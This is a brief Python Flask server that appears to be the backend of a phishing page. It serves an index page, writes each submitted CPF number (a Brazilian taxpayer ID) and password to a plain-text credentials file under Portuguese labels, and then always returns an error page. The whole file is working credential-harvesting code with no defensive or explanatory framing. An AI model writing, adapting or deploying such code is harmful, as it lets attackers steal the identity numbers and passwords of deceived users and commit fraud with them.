from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return open("index.html").read()

@app.route('/login', methods=['POST'])
def login():
    print(request.form)
    with open("credentials.txt", "a") as f:
        f.write(f"Usuario: {request.form['cpf']} Senha: {request.form['password']}\n")
    return open("erro.html").read()

app.run(host='0.0.0.0', port=8080)